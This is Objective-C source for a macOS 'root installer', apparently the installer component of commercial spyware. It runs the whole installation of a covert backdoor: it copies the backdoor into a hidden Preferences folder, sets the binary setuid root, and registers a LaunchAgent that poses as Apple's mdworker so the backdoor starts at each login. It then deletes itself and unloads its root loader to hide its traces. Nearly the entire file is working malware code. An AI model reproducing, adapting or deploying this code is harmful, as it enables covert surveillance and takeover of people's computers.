/*
 * MacOS root installer
 * Root installer for online/offline installation
 * 
 * Created by Alfredo 'revenge' Pesoli on 30/03/2011
 * Copyright (C) HT srl 2011. All rights reserved
 */

#import <Foundation/Foundation.h>

#import <sys/stat.h>
#import <sys/types.h>
#import <pwd.h>

//#define DEBUG
#define INSTALLER_PLIST @"com.apple.mdworkers"
#define BACKDOOR_DAEMON_PLIST @"Library/LaunchAgents/com.apple.mdworker.plist"


void changeAttributesForBinaryAtPath(NSString *aPath, int uid, int gid, u_long permissions)
{
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner      = [NSNumber numberWithInt: uid];
  NSValue *group      = [NSNumber numberWithInt: gid];

  NSFileManager *_fileManager = [NSFileManager defaultManager];
  NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                  permission,
                                  NSFilePosixPermissions,
                                  owner,
                                  NSFileOwnerAccountID,
                                  group,
                                  NSFileGroupOwnerAccountID,
                                  nil];

  [_fileManager setAttributes: tempDictionary
                 ofItemAtPath: aPath
                        error: nil];
}

void executeTask(NSString *anAppPath,
                 NSArray *arguments,
                 BOOL waitForExecution)
{
  if ([[NSFileManager defaultManager] fileExistsAtPath: anAppPath] == NO)
    {
      return;
    }

  NSTask *task = [[NSTask alloc] init];
  [task setLaunchPath: anAppPath];

  if (arguments != nil)
    [task setArguments: arguments];

  NSPipe *_pipe = [NSPipe pipe];
  [task setStandardOutput: _pipe];
  [task setStandardError:  _pipe];

  [task launch];

  if (waitForExecution == YES)
    [task waitUntilExit];

  [task release];
}

BOOL savePlist(NSString *username, id anObject, NSString *aPath)
{
  BOOL success = [anObject writeToFile: aPath
                            atomically: YES];
  
  if (success == NO)
    {
#ifdef DEBUG
      NSLog(@"Error while writing plist at %@", aPath);
#endif
      return NO;
    }
  
  //
  // Force owner since we can't remove that file if not owned by us
  // with removeItemAtPath:error (e.g. backdoor upgrade)
  //
  NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", username];
  NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
    @"/usr/bin/chown",
    userAndGroup,
    aPath,
    nil];
  
#ifdef DEBUG
  NSLog(@"forcing owner: %@", userAndGroup);
#endif

  executeTask(@"/usr/bin/sudo", _tempArguments, YES);
  
  [_tempArguments release];
  return YES;
}

BOOL createLaunchAgent(NSString *username, NSString *dirName, NSString *aBinary)
{
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
  NSDictionary *innerDict;
  NSString *userHome = [[NSString alloc] initWithFormat: @"/Users/%@", username];
  
  NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
           userHome,
           BACKDOOR_DAEMON_PLIST];

#ifdef DEBUG
  NSLog(@"userHome: %@", userHome);
#endif

  NSString *launchAgentsPath = [NSString stringWithFormat: @"%@/Library/LaunchAgents",
           userHome];

  if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentsPath] == NO)
    {

#ifdef DEBUG
      NSLog(@"LaunchAgents folder does not exist");
#endif

      //
      // Create LaunchAgents dir
      //
      NSArray *arguments = [NSArray arrayWithObjects:
        @"-u",
        username,
        @"/bin/mkdir",
        launchAgentsPath,
        nil];

      executeTask(@"/usr/bin/sudo", arguments, YES);
      //if (mkdir([launchAgentsPath UTF8String], 0755) == -1)
        //{
//#ifdef DEBUG
          //NSLog(@"Error on LaunchAgents mkdir");
//#endif
          //return NO;
        //}
    }
  
  NSString *backdoorPath = [NSString stringWithFormat: @"%@/Library/Preferences/%@",
           userHome,
           dirName];
  NSString *backdoorBinaryPath = [NSString stringWithFormat: @"%@/%@",
           backdoorPath,
           aBinary];

  NSString *errorLog = [NSString stringWithFormat: @"%@/ji33", backdoorPath];
  NSString *outLog   = [NSString stringWithFormat: @"%@/ji34", backdoorPath];

  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
               @"com.apple.mdworker", @"Label",
               @"Aqua", @"LimitLoadToSessionType",
               [NSNumber numberWithBool: FALSE], @"OnDemand",
               [NSArray arrayWithObjects: backdoorBinaryPath, nil], @"ProgramArguments",
               errorLog, @"StandardErrorPath",
               outLog, @"StandardOutPath",
               nil];
               //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
  
  [rootObj addEntriesFromDictionary: innerDict];
  [innerDict release];
  [userHome release];
  
  return savePlist(username, rootObj, ourPlist);
}

void deleteCurrentDir()
{
  [[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                             error: nil];
}

int main(int ac, char *av[])
{
  //
  // <username> <backdoor_dir_name> <backdoor_binary_name>
  //
  if (av[1] == NULL || av[2] == NULL || av[3] == NULL)
    return 0;

  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  NSFileManager *_fileManager = [NSFileManager defaultManager];

  //
  // Parse Arguments
  //
  NSString *username = [[NSString alloc] initWithCString: av[1]
                                                encoding: NSUTF8StringEncoding];
  NSString *_backdoorDir = [[NSString alloc] initWithCString: av[2]
                                                    encoding: NSUTF8StringEncoding];
  NSString *backdoorDir = [[NSString alloc] initWithFormat: @"%@.app", _backdoorDir];

  NSString *binary = [[NSString alloc] initWithCString: av[3]
                                              encoding: NSUTF8StringEncoding];

  NSString *destinationDir = [[NSString alloc] initWithFormat: @"/Users/%@/Library/Preferences/%@",
                              username,
                              backdoorDir];

  NSString *binaryPath = [[NSString alloc] initWithFormat: @"%@/%@",
           destinationDir,
           binary];

  if ([_fileManager fileExistsAtPath: binaryPath])
    {
      //
      // In case the backdoor binary is already there delete our dir
      // and do nothing
      //
      deleteCurrentDir();

      return 0;
    }

  //
  // Create destination dir
  //
  NSArray *arguments = [NSArray arrayWithObjects:
    @"-u",
    username,
    @"/bin/mkdir",
    destinationDir,
    nil];

  executeTask(@"/usr/bin/sudo", arguments, YES);
  //mkdir([destinationDir UTF8String], 0755);

  //
  // Delete ourself in order to avoid to be copied in the next for cycle
  //
  [_fileManager removeItemAtPath: [[NSBundle mainBundle] executablePath]
                           error: nil];

  NSString *currentDir = [[NSString alloc] initWithFormat: @"%@",
           [[NSBundle mainBundle] bundlePath]];

  NSArray *dirContent = [_fileManager contentsOfDirectoryAtPath: currentDir
                                                          error: nil];

  int filesCount = [dirContent count];
  int i;

  for (i = 0; i < filesCount; i++)
    {
      NSString *fileName = [dirContent objectAtIndex: i];
      NSString *filePath = [NSString stringWithFormat:
        @"%@/%@", currentDir, fileName];
      NSString *destPath = [NSString stringWithFormat:
        @"%@/%@", destinationDir, fileName];

      //
      // Move every single file left to destPath
      //
      [_fileManager moveItemAtPath: filePath
                            toPath: destPath
                             error: nil];
    }

  [currentDir release];
  [destinationDir release];

  u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  changeAttributesForBinaryAtPath(binaryPath, 0, 0, permissions);

  //
  // Now drop launchAgent file inside user home in order to let the backdoor load
  // on user login
  //
  if (createLaunchAgent(username, backdoorDir, binary) == NO)
    {
#ifdef DEBUG
      NSLog(@"Error on createLaunchAgent");
#endif
    }

  //
  // Create mdworker.flg so that once loaded the backdoor won't relaunch itself
  // through launchd (will be already loaded by launchd)
  //
  NSString *mdworker = [[NSString alloc] initWithFormat: @"%@/mdworker.flg",
           destinationDir];
  [@"" writeToFile: mdworker
        atomically: YES
          encoding: NSUTF8StringEncoding
             error: nil];
  [mdworker release];

  [backdoorDir release];
  [_backdoorDir release];
  [binary release];

  //
  // Delete current dir
  //
  NSError *err;

  if ([_fileManager removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                               error: &err] == NO)
    {
#ifdef DEBUG
      NSLog(@"Error on remove current dir: %@", [err description]);
#endif
    }

  //
  // Delete installer plist path
  //
  NSString *installerPlistPath = [[NSString alloc] initWithFormat: @"/System/Library/LaunchDaemons/%@.%@.plist",
           INSTALLER_PLIST,
           username];

  [_fileManager removeItemAtPath: installerPlistPath
                           error: nil];
  [installerPlistPath release];

  //
  // Safe to unload ourself
  //
  NSString *rootLoaderLabel = [NSString stringWithFormat: @"com.apple.mdworkers.%@",
           username];

#ifdef DEBUG
  NSLog(@"Removing %@", rootLoaderLabel);
#endif

  NSArray *args = [NSArray arrayWithObjects:
    @"remove",
    rootLoaderLabel,
    nil];

  executeTask(@"/bin/launchctl", args, YES);

  [binaryPath release];
  [username release];
  [outerPool release];
  return 0;
}
